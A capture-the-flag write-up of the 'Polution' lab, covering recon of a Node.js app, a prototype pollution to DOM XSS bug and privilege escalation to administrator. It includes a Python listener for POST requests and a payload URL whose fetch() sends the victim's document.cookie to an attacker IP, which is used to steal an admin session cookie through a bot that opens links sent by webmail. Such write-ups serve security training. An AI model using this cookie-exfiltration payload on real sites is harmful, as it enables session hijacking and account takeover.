# Polution (HSM)

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4003147d-cf2a-4a3f-b35c-a424acbf6cda" />


# Objective

You are a member of the Hack Smarter Red Team and your organization is beginning to roll out a managed SOC service. You've been provided access to a staging version of the web app before it's pushed to production. > Note from Tyler: Is the typo intentional? Let's just pretend like it is

The credentials below mirror a customer. Are you able to elevate your privileges and become an Administrator?

```
pentester:HackSmarter123
```

# Recon

## Rustscan

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c1:cb:71:52:5a:83:2e:57:00:aa:c7:56:b4:f1:e5:a1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMXS2zCfV/cJsN0i3he9x/ZTOOS8LKEpg/5zjxWpur98BlfZMjscTMau312YPxM4lj9WmNdcGrvFDSvXaA+VEls=
|   256 14:00:a4:10:bd:82:19:73:95:f4:2a:2c:9f:bf:17:e0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIARJWzpyyGVawUyc0qNx2fge8Gpel7ObfqFfdt/VFIEI

3000/tcp open  http    syn-ack ttl 62 Node.js Express framework
|_http-title: Hacksmarter | Login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

- I identified SSH (20) and HTTP (3000) running a Node.js web application.

## SSH (20)

```bash
┌──(taako㉿kali)-[~/CTF/Polution-HSM]
└─$ ssh root@polution.hsm       
The authenticity of host 'polution.hsm (10.1.84.122)' can't be established.
ED25519 key fingerprint is: SHA256:f1EDRQACStbpi0tElC8eSeBpeCnuuk2x/UCxz+l/JdU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'polution.hsm' (ED25519) to the list of known hosts.
root@polution.hsm: Permission denied (publickey).
```

- I confirmed that SSH utilizes key-based authentication.

## HTTP(3000)

### Dirsearch

```bash
┌──(taako㉿kali)-[~/CTF/Polution-HSM]
└─$ sudo dirsearch -u http://polution.hsm:3000 -e php,js,json,html,env -r

Target: http://polution.hsm:3000/

[12:47:12] Starting: 
[12:47:31] 200 -    6KB - /dashboard/                                  
[12:47:31] 200 -    6KB - /dashboard
                                                                             
Task Completed
```

- I searched the dashboard but found only one directory `/dashboard/` , no deeper paths were visible.

### Vhosts

```jsx
No vhosts found
```

### Website Features

- I spotted a login page, and while I already have credentials, I’ll first test if I can bypass authentication entirely.

<img width="1031" height="690" alt="image" src="https://github.com/user-attachments/assets/d1039946-2ce3-41c1-a16a-cdb4bf08bf12" />


- I’m testing the directory I discovered: `dashboard`

<img width="1030" height="455" alt="image" src="https://github.com/user-attachments/assets/00747073-1300-4510-80e0-8219de66fe59" />


- I successfully accessed an Audit Log Management dashboard.
- I noted that I am logged in as a guest, so I’ll capture the request to see if I can extract more user information.
- I observed a "run query" button in the `audit log`, which suggests a potential code injection vector.

<img width="896" height="232" alt="image" src="https://github.com/user-attachments/assets/bca06d34-b3c3-4f81-9b5e-c8352221ec0e" />


- I inspected the JavaScript and found that the Audit Log input is sanitized using `innerText`, making it an unlikely exploit endpoint.

<img width="1030" height="649" alt="image" src="https://github.com/user-attachments/assets/20fb50a9-5c86-41e1-bf83-fa5505b373de" />


- I discovered a prefilled `admin` email address in the webmail, which I may leverage in a future attack.
    - Since I know I have SSH as an open port, maybe this user can be our privilege escalation target
- I suspect that because the site asks for links, there may be an automated agent opening them, pointing toward a potential XSS vulnerability.
- `Incident Response` gives me a 403: forbidden error since I am accessing using a guest profile.
- I logged in with `pentester` credentials but realized they provide the same access level as the guest account.

### DOM Invader

- I used `DOM Invader` to isolate a few potential prototype pollution exploits.

<img width="1814" height="265" alt="image" src="https://github.com/user-attachments/assets/baaeb628-7aca-4863-a2ca-c8e00b974019" />


- I executed the first exploit, which generated this URL:

```bash
http://polution.hsm:3000/dashboard#__proto__.renderCallback=%22%27%3E%3Cimg+src+onerror%3Dalert%281%29%3E
```

- I confirmed via the URL that I can inject into the DOM, though it didn’t trigger my intended payload initially.

<img width="683" height="415" alt="image" src="https://github.com/user-attachments/assets/f8041deb-1d63-496e-a168-b21a410ffcfe" />


- I removed the `%27>` string from the URL and successfully triggered my desired `alert(1)` payload.

<img width="1045" height="479" alt="image" src="https://github.com/user-attachments/assets/b89d2cbe-740e-4013-9aa0-22dcbcffd1d9" />


- I swapped the alert text for `document.cookie`, which revealed that the cookies are not properly secured.

<img width="1255" height="736" alt="image" src="https://github.com/user-attachments/assets/959ed4ae-a4ba-48ad-b25d-d0b233094266" />


# The Attack Path

## Creating the HTTP Server

### Python script

- I developed a Python script to spin up an HTTP server to receive incoming POST commands.
    - I made the script executable. In the future I may add it to my path to streamline the process.

```python
#!/usr/bin/env python3

import argparse
from http.server import HTTPServer, BaseHTTPRequestHandler

class RequestHandler(BaseHTTPRequestHandler):

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)

        print("\n--- POST Request Received ---")
        
        try:
            print(body.decode("utf-8"))
        except UnicodeDecodeError:
            print(body)

        print("--- End Request ---\n")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        # Optional: suppress default HTTP logging
        return

def main():
    parser = argparse.ArgumentParser(description="Simple POST logging HTTP server")
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=80,
        help="Port to run the server on (default: 80)"
    )

    args = parser.parse_args()

    server = HTTPServer(("0.0.0.0", args.port), RequestHandler)

    print(f"Server listening on port {args.port}...")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down server.")
        server.server_close()

if __name__ == "__main__":
    main()
```

## Creating the Payload

- I verified the URL for prototype pollution works, so now I just need to wrap `document.cookie` in a POST request.
- I need the payload to force the client to fetch my server and then POST its cookies to me.

```bash
http://polution.hsm:3000/dashboard#__proto__.renderCallback=<img src=x onerror=alert(document.cookie)>

## The First Part of the URL is the dashboard
http://polution.hsm:3000/dashboard#

## This is the prototype pollution
__proto__.renderCallback=

## This is our Payload boiler plate that will attempt to load an image to the DOM, but because it will be unable to, it will throw the error with will run our Payload
<img src=x onerror=

## This is our Payload that says, fetch the server we made, and use a POST request to send document.cookie to our log
"fetch('http://10.200.38.47',{method:'POST',body:document.cookie});"/>

##Putting it all together, our final URL is:
http://polution.hsm:3000/dashboard#__proto__.renderCallback=<img src=x onerror="fetch('http://10.200.38.47',{method:'POST',body:document.cookie});"/>
```

- I tested the URL and confirmed I can retrieve my own cookies and send them to my server.

```bash
┌──(taako㉿kali)-[~/CTF/Polution-HSM]
└─$ ./start_server.py
Server listening on port 80...

--- POST Request Received ---
user=pentester; test=h4x0r
--- End Request ---
```

## Injecting the Payload

- I filled out the webmail form and inserted my payload in the message box of the webform, but my server did not receive any POST requests.

<img width="1298" height="541" alt="image" src="https://github.com/user-attachments/assets/11b0440b-aa89-4690-bcef-851d326964ac" />

- I realized it initially failed because I used the polution.hsm domain from my local `/etc/hosts`, which the target can't resolve. I updated the URL to use the target IP address instead.

```bash
http://10.1.250.200:3000/dashboard#__proto__.renderCallback=<img src=x onerror="fetch('http://10.200.38.47',{method:'POST',body:document.cookie});"/>
```

- I successfully captured the target's cookies once the connection was established.

```bash
┌──(taako㉿kali)-[~/CTF/Polution-HSM]
└─$ ./start_server.py
Server listening on port 80...

--- POST Request Received ---
session=HS_ADMIN_7721_SECURE_AUTH_TOKEN; user=admin
--- End Request ---
```

# Capturing the Flag

<img width="864" height="197" alt="image" src="https://github.com/user-attachments/assets/f65b7215-0097-4d52-a9a5-d935a8b77798" />


- I imported the session cookie into my browser, which granted me access to the Incident Response page where I read the flag.

<img width="708" height="191" alt="image" src="https://github.com/user-attachments/assets/92c2e1a1-0ca0-4594-a5f9-d4ac7443fa2f" />
